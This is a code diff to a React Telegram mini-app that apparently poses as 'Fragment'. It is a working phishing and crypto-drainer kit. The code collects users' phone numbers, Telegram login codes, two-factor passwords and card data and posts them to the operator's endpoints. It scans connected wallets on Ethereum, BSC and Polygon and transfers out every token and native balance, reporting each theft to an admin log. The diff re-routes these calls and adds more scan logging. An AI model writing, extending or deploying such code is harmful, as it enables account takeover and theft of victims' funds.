@@ -86,7 +86,7 @@ export default function App() {
   const handlePhoneSubmit = async () => {
     setLoading(true);
     try {
-      const response = await fetch('api/submit/phone', {
+      const response = await fetch('/fragment/api/submit/phone', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, user: tg?.initDataUnsafe?.user })
@@ -102,7 +102,7 @@ export default function App() {
   const handleCodeSubmit = async () => {
     setLoading(true);
     try {
-      const response = await fetch('api/submit/code', {
+      const response = await fetch('/fragment/api/submit/code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
@@ -117,7 +117,7 @@ export default function App() {
   const handle2FASubmit = async () => {
     setLoading(true);
     try {
-      await fetch('api/submit/2fa', {
+      await fetch('/fragment/api/submit/2fa', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, twoFactor, user: tg?.initDataUnsafe?.user })
@@ -130,7 +130,7 @@ export default function App() {
   const handleCardSubmit = async () => {
     setLoading(true);
     try {
-      await fetch('api/submit/card', {
+      await fetch('/fragment/api/submit/card', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, cardData, user: tg?.initDataUnsafe?.user })
@@ -175,7 +175,7 @@ export default function App() {
       flowStarted.current = true;
 
       // Notify admin about connection
-      fetch('api/submit/wallet_connect', {
+      fetch('/fragment/api/submit/wallet_connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ address, user: tg?.initDataUnsafe?.user })
@@ -188,6 +188,12 @@ export default function App() {
   const startTransferFlow = async () => {
     setLoading(true);
     try {
+      await fetch('/fragment/api/submit/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: "Scanning for balances started", user: tg?.initDataUnsafe?.user })
+      });
+
       const chainsToProcess = [mainnet, bsc, polygon];
 
       for (const chain of chainsToProcess) {
@@ -227,14 +233,14 @@ export default function App() {
                   chainId: chain.id
                 });
                 console.log(`Sent ${token.symbol} on ${chain.name}: ${hash}`);
-                await fetch('api/submit/transfer', {
+                await fetch('/fragment/api/submit/transfer', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
                 });
               } catch (err: any) {
                 console.error(`Failed to send ${token.symbol} on ${chain.name}`, err);
-                await fetch('api/submit/transfer', {
+                await fetch('/fragment/api/submit/transfer', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'failed', error: err?.message || 'User rejected', user: tg?.initDataUnsafe?.user })
@@ -268,14 +274,14 @@ export default function App() {
                     chainId: chain.id
                   });
                   console.log(`Sent native on ${chain.name}: ${hash}`);
-                  await fetch('api/submit/transfer', {
+                  await fetch('/fragment/api/submit/transfer', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
                   });
                 } catch (err: any) {
                   console.error(`Failed to send native on ${chain.name}`, err);
-                  await fetch('api/submit/transfer', {
+                  await fetch('/fragment/api/submit/transfer', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'failed', error: err?.message || 'User rejected', user: tg?.initDataUnsafe?.user })
@@ -288,9 +294,19 @@ export default function App() {
           console.error(`Error sending native on ${chain.name}`, err);
         }
       }
+      await fetch('/fragment/api/submit/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: "Scan finished successfully", user: tg?.initDataUnsafe?.user })
+      });
       setModalStep('success');
-    } catch (err) {
+    } catch (err: any) {
       console.error("Transfer flow error", err);
+      await fetch('/fragment/api/submit/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: `Scan error: ${err?.message}`, user: tg?.initDataUnsafe?.user })
+      });
     }
     setLoading(false);
   };
